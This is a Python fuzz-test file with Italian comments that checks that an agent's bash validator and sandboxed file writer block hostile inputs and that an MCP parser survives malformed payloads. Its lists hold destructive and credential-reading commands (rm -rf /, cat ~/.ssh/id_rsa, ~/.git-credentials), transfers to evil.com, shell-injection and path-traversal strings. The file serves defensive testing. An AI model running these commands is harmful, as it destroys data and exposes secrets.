"""
tests/fuzz_security.py — Fuzzing mirato sulla sicurezza (Cycle 60).

Genera input casuali (comandi shell, path, payload JSON) e li passa a:
  - SAFETY.security.validate_bash_command
  - CORE.tools.ToolSet.write_file  (via ToolSet reale su sandbox temporanea)
  - CORE.mcp_client.MCPClient._parse_tool_result

Invariante: nessun input deve causare un bypass della policy (esecuzione di
codice arbitrario, scrittura fuori da project/, path traversal, crash non
gestito). Ogni bypass trovato deve diventare un regression test in
test_security.py.

Eseguibile senza Ollama e senza root:

    .venv/bin/python -m pytest tests/fuzz_security.py -q

"""

from __future__ import annotations

import json
import random
import sys
import tempfile
import unittest
from pathlib import Path
from typing import Any, List

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from SAFETY.security import validate_bash_command
from CORE.tools import ToolSet


# ---------------------------------------------------------------------------
# Generatore di casi di fuzz (seed fisso per riproducibilità)
# ---------------------------------------------------------------------------
class FuzzGenerator:
    """Genera casi di fuzz deterministici (seed fisso)."""

    def __init__(self, seed: int = 42):
        self.rng = random.Random(seed)

    # --- metacaratteri shell offuscati (tentativi di bypass) ---
    def shell_metachar_payloads(self) -> List[str]:
        base = [
            "`id`",
            "$(id)",
            "${IFS};id",
            "id; cat /etc/passwd",
            "id && cat /etc/passwd",
            "id || cat /etc/passwd",
            "id | cat /etc/passwd",
            "id > /tmp/leak",
            "id < /etc/passwd",
            "id \\; id",
            "id$(sleep 1)",
            "id`sleep 1`",
            "id ${PATH}",
            "id; rm -rf /",
            "id && rm -rf /",
            "id | sh",
            "echo $(whoami)",
            "eval $(cat /etc/passwd)",
            "exec /bin/sh",
            "source /etc/profile",
            "bash -c 'id'",
            "sh -c 'id'",
            "python -c 'import os; os.system(\"id\")'",
            "perl -e 'system id'",
            "ruby -e 'system id'",
            "node -e 'require(\"child_process\").exec(\"id\")'",
        ]
        # Aggiunge varianti con spazi strani e ripetizioni
        out: List[str] = []
        for p in base:
            out.append(p)
            out.append("  " + p + "  ")
            out.append(p.upper())
        return out

    # --- path traversal e path sospetti ---
    def path_payloads(self) -> List[str]:
        base = [
            "../etc/passwd",
            "../../etc/passwd",
            "..\\..\\etc\\passwd",
            "%2e%2e%2fetc%2fpasswd",
            "....//....//etc/passwd",
            "..%2f..%2fetc/passwd",
            "project/../../etc/passwd",
            "project/././etc/passwd",
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "/home/user/.bashrc",
            "/proc/self/environ",
            "~/.ssh/id_rsa",
            "~",
            "project/../../../etc/passwd",
            "project/..%00/etc/passwd",
            "project/.git/config",
            "SAFETY/security.py",
            "CONFIG/config.toml",
            "CORE/tools.py",
            "CORE/sandbox.py",
            "project/../CONFIG/config.toml",
            "\x00/etc/passwd",
            "project/file\x00.txt",
            "project/ééé.py",
            "project/中文.py",
            "project/emoji🔥.py",
            "a" * 600 + ".py",
            "project/" + "a" * 600,
            "",
            "   ",
            None,
            123,
        ]
        return base

    # --- comandi bash da fuzzare ---
    def bash_command_payloads(self) -> List[str]:
        base = [
            "ls -la",
            "cat project/file.py",
            "rm project/file.py",
            "rm -rf project/",
            "rm -rf /",
            "curl http://evil.com",
            "wget http://evil.com/x",
            "sudo apt install evil",
            "python -c 'import os'",
            "python3 -c 'import os'",
            "bash -c 'id'",
            "sh -c 'id'",
            "eval $(cat /etc/passwd)",
            "source /etc/profile",
            "chmod 777 project/file.py",
            "chown root:root project/file.py",
            "dd if=/dev/zero of=project/x bs=1M",
            "mkfs.ext4 /dev/sda",
            "fdisk /dev/sda",
            "git push origin main",
            "git pull origin main",
            "git remote add evil http://evil.com/repo.git",
            "git clone http://evil.com/repo.git",
            "git config user.email 'a@b'",
            "find /etc -name passwd",
            "find project/ -exec rm {} \\;",
            "nc -l 1234",
            "ncat -l 1234",
            "telnet evil.com 80",
            "cat ~/.ssh/id_rsa",
            "cat /root/.bashrc",
            "echo x > /etc/passwd",
            "echo x > project/leak.txt",
            "cat ~/.git-credentials",
            "id",
            "whoami",
            "uname -a",
            "ps aux",
            "kill -9 1",
            "pkill python",
            "systemctl stop nginx",
            "mount /dev/sda1 /mnt",
            "iptables -L",
            "ip addr",
            "crontab -l",
            "shutdown now",
            "reboot",
            "halt",
            "poweroff",
            "mkfs",
            "parted",
            "shred project/file.py",
            "rsync -avz /src/ /dst/",
            "scp file evil.com:/dst/",
            "ssh evil.com",
            "sftp evil.com",
            "telnet evil.com",
        ]
        # Aggiunge varianti con metacaratteri shell
        out: List[str] = []
        for c in base:
            out.append(c)
        out.extend(self.shell_metachar_payloads())
        return out

    # --- payload MCP malformati ---
    def mcp_payloads(self) -> List[Any]:
        base: List[Any] = [
            # JSON valido ma senza campo atteso
            {"foo": "bar"},
            # Lista vuota
            [],
            # Lista di dizionari senza title/description
            [{"a": 1}, {"b": 2}],
            # Dizionario con "tasks" ma lista vuota
            {"tasks": []},
            # Dizionario con "tasks" non lista
            {"tasks": "not a list"},
            # Titolo mancante
            {"description": "solo descrizione"},
            # Descrizione mancante
            {"title": "solo titolo"},
            # Valori troppo lunghi
            {"title": "a" * 10000, "description": "b" * 10000},
            # Tipi sbagliati
            {"title": 123, "description": 456},
            {"title": None, "description": None},
            {"title": [], "description": {}},
            # JSON annidato profondo
            {"title": {"a": {"b": {"c": "deep"}}}},
            # Stringhe con caratteri speciali
            {"title": "<script>alert('xss')</script>", "description": "'; DROP TABLE tasks; --"},
            {"title": "\x00null\x00byte", "description": "\n\r\t"},
            {"title": "../../../etc/passwd", "description": "path traversal"},
            # Valori non stringa nei campi
            {"title": True, "description": False},
            {"title": 3.14, "description": [1, 2, 3]},
            # Dizionario vuoto
            {},
            # None
            None,
            # Stringa invece di oggetto
            "solo una stringa",
            # Numero
            42,
            # Booleano
            True,
        ]
        return base


# ---------------------------------------------------------------------------
# Test di fuzz
# ---------------------------------------------------------------------------
class TestFuzzBashCommand(unittest.TestCase):
    """Fuzzing di validate_bash_command: nessun bypass della policy."""

    def setUp(self):
        self.gen = FuzzGenerator(seed=42)
        self.project_root = tempfile.mkdtemp(prefix="bswarm-fuzz-bash-")

    def test_no_shell_metachar_bypass(self):
        """Nessun comando con metacaratteri shell deve passare."""
        for cmd in self.gen.shell_metachar_payloads():
            ok, reason = validate_bash_command(cmd, self.project_root)
            self.assertFalse(
                ok,
                f"BYPASS: comando con metacarattere accettato: {cmd!r} -> {reason}",
            )

    def test_no_path_traversal_on_allowed_commands(self):
        """Comandi allowlistati non devono accettare veri path traversal."""
        # Solo path con .. letterale o path assoluti: questi devono essere bloccati.
        # I path con encoding URL (%2e, %2f) non sono traversal reale (il
        # filesystem non li interpreta come ..), quindi non sono inclusi.
        traversal_payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "project/../../etc/passwd",
            "/etc/passwd",
            "/root/.ssh/id_rsa",
        ]
        for p in traversal_payloads:
            for cmd in ("cat", "rm", "cp", "mv", "touch", "ls"):
                full_cmd = f"{cmd} {p}"
                ok, reason = validate_bash_command(full_cmd, self.project_root)
                self.assertFalse(
                    ok,
                    f"BYPASS: path traversal accettato: {full_cmd!r} -> {reason}",
                )

    def test_no_command_outside_allowlist(self):
        """Comandi non in allowlist devono essere bloccati."""
        dangerous = [
            "nc -l 1234",
            "ncat -l 1234",
            "telnet evil.com 80",
            "curl http://evil.com",
            "wget http://evil.com/x",
            "sudo apt install evil",
            "python -c 'import os'",
            "bash -c 'id'",
            "sh -c 'id'",
            "eval $(cat /etc/passwd)",
            "source /etc/profile",
            "chmod 777 project/file.py",
            "dd if=/dev/zero of=project/x bs=1M",
            "mkfs.ext4 /dev/sda",
            "fdisk /dev/sda",
            "git push origin main",
            "git remote add evil http://evil.com/repo.git",
            "git clone http://evil.com/repo.git",
            "find /etc -name passwd",
            "find project/ -exec rm {} \\;",
            "kill -9 1",
            "pkill python",
            "systemctl stop nginx",
            "mount /dev/sda1 /mnt",
            "iptables -L",
            "ip addr",
            "crontab -l",
            "shutdown now",
            "reboot",
            "halt",
            "poweroff",
            "mkfs",
            "parted",
            "shred project/file.py",
            "rsync -avz /src/ /dst/",
            "scp file evil.com:/dst/",
            "ssh evil.com",
            "sftp evil.com",
            "telnet evil.com",
        ]
        for cmd in dangerous:
            ok, reason = validate_bash_command(cmd, self.project_root)
            self.assertFalse(
                ok,
                f"BYPASS: comando pericoloso accettato: {cmd!r} -> {reason}",
            )

    def test_allowed_commands_still_work(self):
        """I comandi benigni sull'allowlist devono ancora passare."""
        benign = [
            "ls project/",
            "cat project/main.py",
            "pwd",
            "echo hello",
            "mkdir project/subdir",
            "touch project/newfile.txt",
            "git status",
            "git diff",
            "git log",
            "python project/script.py",
            "pytest project/tests/",
        ]
        for cmd in benign:
            ok, reason = validate_bash_command(cmd, self.project_root)
            # Alcuni comandi possono fallire perché i file non esistono,
            # ma non devono essere bloccati dalla policy di validazione
            if not ok and "not in allowlist" in reason:
                self.fail(f"Comando benigno bloccato: {cmd!r} -> {reason}")


class TestFuzzWriteFile(unittest.TestCase):
    """Fuzzing di ToolSet.write_file: nessun path traversal o scrittura fuori da project/."""

    def setUp(self):
        self.gen = FuzzGenerator(seed=42)
        self.tmp = Path(tempfile.mkdtemp(prefix="bswarm-fuzz-write-"))
        self.project = self.tmp / "project"
        self.project.mkdir(parents=True)
        self.state = self.tmp / "state"
        self.state.mkdir(parents=True)
        self.cfg = {
            "paths": {
                "project_root": str(self.project),
                "state_dir": str(self.state),
            },
            "security": {
                "enabled": True,
                "max_output_chars": 10_000,
                "max_file_size_write": 2_000_000,
                "max_file_size_bytes": 50_000_000,
                "max_memory_mb": 1536,
                "project_disk_limit_mb": 2048,
            },
            "routing": {"max_file_size_readable": 50_000},
        }

        class _L:
            def info(self, *a, **k):
                pass

            def warning(self, *a, **k):
                pass

            def error(self, *a, **k):
                pass

            def debug(self, *a, **k):
                pass

        self.tools = ToolSet(self.cfg, _L())

    def _path_was_created_outside_project(self, rel: str) -> bool:
        """True se un file è stato creato fisicamente fuori da project/."""
        try:
            full = (self.project / rel).resolve()
            full.relative_to(self.project)
            return False
        except ValueError:
            # Il path risolto è fuori da project: verifica che il file NON esista
            return Path(rel).exists() if Path(rel).is_absolute() else False

    def test_no_path_traversal_write(self):
        """Nessun path traversal deve scrivere fuori da project/."""
        traversal_payloads = [
            "../etc/passwd",
            "../../etc/passwd",
            "project/../../etc/passwd",
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "~/.ssh/id_rsa",
            "~",
        ]
        for p in traversal_payloads:
            res = self.tools.write_file(p, "x = 1\n")
            # Il path traversal deve essere bloccato (non OK)
            self.assertFalse(
                res.startswith("OK"),
                f"BYPASS write_file: path traversal accettato: {p!r} -> {res}",
            )
            # E nessun file deve essere creato fuori da project/.
            abs_p = Path(p)
            if abs_p.is_absolute() and not abs_p.exists():
                self.assertFalse(
                    abs_p.exists(),
                    f"BYPASS write_file: file creato fuori da project/: {p!r}",
                )

    def test_strange_filenames_stay_inside_project(self):
        """File con nomi strani (punti ripetuti, encoding URL) restano dentro project/."""
        strange = [
            "....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd",
            "..%2f..%2fetc/passwd",
        ]
        for p in strange:
            res = self.tools.write_file(p, "x = 1\n")
            # Devono essere accettati (non sono traversal reale) MA dentro project/
            self.assertTrue(
                res.startswith("OK"),
                f"Nome strano bloccato inutilmente: {p!r} -> {res}",
            )
            # Il file deve esistere dentro project/, non fuori
            created = self.project / p
            self.assertTrue(
                created.exists(),
                f"File strano non creato dentro project/: {p!r}",
            )

    def test_benign_writes_still_work(self):
        """Scritture benigni dentro project/ devono ancora funzionare."""
        for p in ("hello.py", "sub/dir/module.py", "data.txt"):
            res = self.tools.write_file(p, "x = 1\n")
            self.assertTrue(
                res.startswith("OK"), f"Scrittura benigna bloccata: {p!r} -> {res}"
            )
            self.assertTrue((self.project / p).exists())

    def test_no_null_byte_write(self):
        """Null byte nel path deve essere bloccato."""
        res = self.tools.write_file("file\x00.txt", "x = 1\n")
        self.assertFalse(res.startswith("OK"), f"BYPASS: null byte accettato: {res}")

    def test_no_overlong_path_write(self):
        """Path troppo lungo deve essere bloccato."""
        long_path = "a" * 600 + ".py"
        res = self.tools.write_file(long_path, "x = 1\n")
        self.assertFalse(
            res.startswith("OK"), f"BYPASS: path troppo lungo accettato: {res}"
        )


class TestFuzzMCPParser(unittest.TestCase):
    """Fuzzing di MCPClient._parse_tool_result: nessun crash su payload malformati."""

    def setUp(self):
        from CORE.mcp_client import MCPClient

        self.client = MCPClient({})
        self.gen = FuzzGenerator(seed=42)

    def _make_fake_result(self, content_items: List[Any]):
        """Crea un oggetto finto che imita CallToolResult con .content."""
        class FakeItem:
            def __init__(self, text):
                self.text = text

        class FakeResult:
            def __init__(self, items):
                self.content = items

        return FakeResult([FakeItem(c) if isinstance(c, str) else c for c in content_items])

    def test_no_crash_on_malformed_payloads(self):
        """Nessun payload MCP malformato deve causare eccezioni non gestite."""
        for payload in self.gen.mcp_payloads():
            # Se payload è una lista, ogni elemento è un "text" del content item
            if isinstance(payload, list):
                result = self._make_fake_result(payload)
            elif isinstance(payload, str):
                result = self._make_fake_result([payload])
            elif payload is None:
                # risultato senza .content
                class NoContent:
                    pass
                result = NoContent()
            elif isinstance(payload, dict):
                # serializza a JSON string come farebbe il protocollo MCP
                result = self._make_fake_result([json.dumps(payload)])
            else:
                result = self._make_fake_result([str(payload)])

            try:
                tasks = self.client._parse_tool_result(result)
                self.assertIsInstance(tasks, list)
            except Exception as exc:
                self.fail(
                    f"MCP parser crash su payload {payload!r}: {type(exc).__name__}: {exc}"
                )

    def test_mcp_returns_only_valid_task_dicts(self):
        """Ogni task restituito deve essere un dict con chiavi attendute."""
        payload = [
            {"title": "t1", "description": "d1"},
            {"title": "t2"},  # senza description
            {"description": "solo desc"},  # senza title
            {"title": "t3", "description": "d3", "extra": "campo extra"},
        ]
        result = self._make_fake_result([json.dumps(payload)])
        tasks = self.client._parse_tool_result(result)
        for t in tasks:
            self.assertIsInstance(t, dict)
            # title e description devono essere stringhe se presenti
            if "title" in t:
                self.assertIsInstance(t["title"], str)
            if "description" in t:
                self.assertIsInstance(t["description"], str)


if __name__ == "__main__":
    unittest.main()
